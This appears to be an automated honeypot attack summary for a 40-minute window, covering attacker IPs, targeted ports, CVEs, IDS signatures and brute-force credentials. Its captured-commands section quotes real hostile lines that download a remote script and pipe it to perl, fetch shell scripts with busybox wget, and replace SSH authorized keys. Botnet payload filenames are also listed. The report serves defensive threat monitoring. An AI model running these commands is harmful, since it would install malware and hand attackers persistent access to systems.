# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-26T15:01:34Z
**Timeframe:** 2025-10-26T14:20:02Z to 2025-10-26T15:00:02Z

**Files Used:**
- agg_log_20251026T142002Z.json
- agg_log_20251026T144001Z.json
- agg_log_20251026T150002Z.json

## Executive Summary
This report summarizes 21,207 attacks recorded by the honeypot network. The majority of attacks were captured by the Cowrie honeypot, with a significant number of events also recorded by Suricata and Honeytrap. The most prominent attacker IP was 172.188.91.73, responsible for a large volume of malicious activities. The primary targets were ports associated with SSH (22) and SIP (5060). A variety of CVEs were exploited, and numerous commands were attempted by attackers, indicating efforts to establish control and probe the systems.

## Detailed Analysis

### Attacks by Honeypot
- Cowrie: 10791
- Suricata: 2939
- Honeytrap: 2632
- Ciscoasa: 1861
- Sentrypeer: 1774
- Dionaea: 905
- Mailoney: 125
- Tanner: 49
- Redishoneypot: 46
- Adbhoney: 17
- ElasticPot: 16
- H0neytr4p: 13
- Honeyaml: 10
- Miniprint: 8
- ConPot: 17
- Dicompot: 3
- Ipphoney: 1

### Top Attacking IPs
- 172.188.91.73
- 106.219.88.148
- 144.172.108.231
- 41.139.164.134
- 185.243.5.121
- 203.171.29.193
- 109.205.211.9
- 196.251.88.103

### Top Targeted Ports/Protocols
- 22
- 5060
- TCP/445
- 445
- 8333
- 5903
- 25
- 5901
- TCP/22
- 80

### Most Common CVEs
- CVE-2002-0013 CVE-2002-0012
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
- CVE-2003-0825
- CVE-2021-44228 CVE-2021-44228
- CVE-2021-3449 CVE-2021-3449
- CVE-2019-11500 CVE-2019-11500
- CVE-2021-35394 CVE-2021-35394
- CVE-2006-2369
- CVE-2009-2765
- CVE-2025-22457 CVE-2025-22457

### Commands Attempted by Attackers
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
- cat /proc/cpuinfo | grep name | wc -l
- Enter new UNIX password: 
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- uname -a ; wget -qO - http://137.184.112.170/perl|perl
- cd /data/local/tmp/; busybox wget http://202.55.132.254/w.sh; ...

### Signatures Triggered
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
- 2024766
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- 2023753
- ET DROP Dshield Block Listed Source group 1
- 2402000
- ET HUNTING RDP Authentication Bypass Attempt
- 2034857
- ET SCAN NMAP -sS window 1024
- 2009582

### Users / Login Attempts
- 345gs5662d34/345gs5662d34
- root/Gm
- root/Godislove
- root/goodluck1001
- root/googlecall
- deploy/deploy123
- root/1q2w3e4r
- root/A123456a
- root/123456789
- root/rootroot

### Files Uploaded/Downloaded
- i;
- soap-envelope
- addressing
- discovery
- env:Envelope>
- i
- wget.sh;
- arm.uhavenobotsxd;
- arm5.uhavenobotsxd;
- arm6.uhavenobotsxd;
- arm7.uhavenobotsxd;
- x86_32.uhavenobotsxd;
- mips.uhavenobotsxd;
- mipsel.uhavenobotsxd;
- lol.sh;
- w.sh;
- c.sh;
- Mozi.m
- perl|perl
- streams

### HTTP User-Agents
- No HTTP user agents were recorded in this period.

### SSH Clients
- No SSH clients were recorded in this period.

### SSH Servers
- No SSH servers were recorded in this period.

### Top Attacker AS Organizations
- No attacker AS organizations were recorded in this period.

## Key Observations and Anomalies
- The high number of attacks from the IP address 172.188.91.73 suggests a targeted or persistent campaign from this source.
- A significant number of commands are related to reconnaissance and establishing persistence, such as manipulating SSH keys and gathering system information.
- The presence of DoublePulsar-related signatures indicates attempts to exploit SMB vulnerabilities.
- A wide array of generic and default credentials were attempted, highlighting the continued use of brute-force attacks.
- Attackers attempted to download and execute shell scripts, a common tactic for deploying malware or botnet clients.
